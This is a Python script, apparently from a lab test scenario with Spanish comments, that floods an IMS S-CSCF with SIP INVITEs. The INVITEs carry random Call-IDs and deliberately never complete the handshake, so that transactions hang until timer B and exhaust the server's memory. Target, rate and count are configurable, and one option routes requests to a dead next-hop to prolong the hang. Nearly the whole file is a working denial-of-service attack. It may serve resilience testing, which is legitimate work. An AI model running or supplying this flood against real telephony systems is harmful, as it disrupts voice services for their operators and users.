#!/usr/bin/env python3
"""txn_exhaust.py — V2 sub-escenario 2b: transaction exhaustion.
Envía INVITEs con Call-ID/tags aleatorios SIN completar el handshake
(sin ACK/BYE): el S-CSCF mantiene cada transacción en TRYING hasta que
expira el timer B (32 s, RFC 3261 §17.1.1), agotando memoria.
Uso: TXN_TARGET=172.20.0.6 TXN_PORT=6060 TXN_COUNT=3000 TXN_RATE=100 \
     python3 txn_exhaust.py
"""
import os
import random
import socket
import time

TGT = os.environ.get("TXN_TARGET", "172.20.0.6")
PORT = int(os.environ.get("TXN_PORT", "6060"))
COUNT = int(os.environ.get("TXN_COUNT", "3000"))
RATE = float(os.environ.get("TXN_RATE", "100"))
USER = os.environ.get("TXN_USER", "1001")
DOMAIN = os.environ.get("TXN_DOMAIN", "ims.mnc070.mcc999.3gppnetwork.org")
# Host del Request-URI: por defecto el dominio (el S-CSCF responde 478 rápido).
# Para forzar transacciones colgadas (sin respuesta final hasta fr_timer),
# apuntar a un next-hop muerto: TXN_RURI_HOST=172.20.0.99 (kali, nada en 5060).
RURI_HOST = os.environ.get("TXN_RURI_HOST", DOMAIN)

SDP = (
    "v=0\r\n"
    "o=- 0 0 IN IP4 172.20.0.99\r\n"
    "s=-\r\n"
    "c=IN IP4 172.20.0.99\r\n"
    "t=0 0\r\n"
    "m=audio 20000 RTP/AVP 0\r\n"
    "a=rtpmap:0 PCMU/8000\r\n"
)
TPL = (
    "INVITE sip:%s@%s SIP/2.0\r\n"  # RURI: USER@RURI_HOST (no From/To)
    "Via: SIP/2.0/UDP 172.20.0.99:5060;branch=z9hG4bKtxn%d\r\n"
    "Max-Forwards: 70\r\n"
    "From: <sip:txn%d@%s>;tag=txn%d\r\n"
    "To: <sip:%s@%s>\r\n"
    "Call-ID: txn-%d@172.20.0.99\r\n"
    "CSeq: 1 INVITE\r\n"
    "Contact: <sip:txn@172.20.0.99:5060>\r\n"
    "Content-Type: application/sdp\r\n"
    "Content-Length: %d\r\n"
    "\r\n"
    "%s"
)


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    gap = 1.0 / RATE if RATE > 0 else 0
    t0 = time.time()
    for _ in range(COUNT):
        u = random.randint(100000, 999999)
        # Sin ACK ni BYE a propósito: la transacción queda colgada hasta timer B.
        s.sendto((TPL % (USER, RURI_HOST, u, u, DOMAIN, u, USER, DOMAIN, u, len(SDP), SDP)).encode(),
                 (TGT, PORT))
        if gap:
            time.sleep(gap)
    dt = time.time() - t0
    print("txn_exhaust: %d INVITE sin ACK a %s:%d en %.1fs (%.0f/s)" % (COUNT, TGT, PORT, dt, COUNT / max(dt, 0.01)))


if __name__ == "__main__":
    main()
